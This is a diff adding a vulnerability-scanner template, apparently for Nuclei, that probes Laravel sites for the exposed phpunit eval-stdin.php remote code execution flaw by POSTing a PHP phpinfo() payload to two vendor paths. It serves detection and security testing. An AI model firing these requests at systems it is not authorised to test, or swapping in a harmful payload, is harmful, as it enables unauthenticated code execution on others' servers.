@@ -1,0 +1,41 @@
+id: Laravel-Phpunit-PreAuth-RCE
+
+info:
+  name: Laravel phpunit PreAuth RCE
+  author: shifacyclewala, hackergautam
+  severity: critical
+  description: A malicious actor can trigger Un authenticated Remote Code Execution
+  tags: rce,laravel,
+  reference: unknown
+
+requests:
+  - raw:
+      - |
+        POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Content-Type: application/xml
+
+        <?php phpinfo();?>
+
+      - |
+        POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Content-Type: application/xml
+
+        <?php phpinfo();?>
+
+
+    redirects: true
+    max-redirects: 5
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - 'phpinfo()'
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
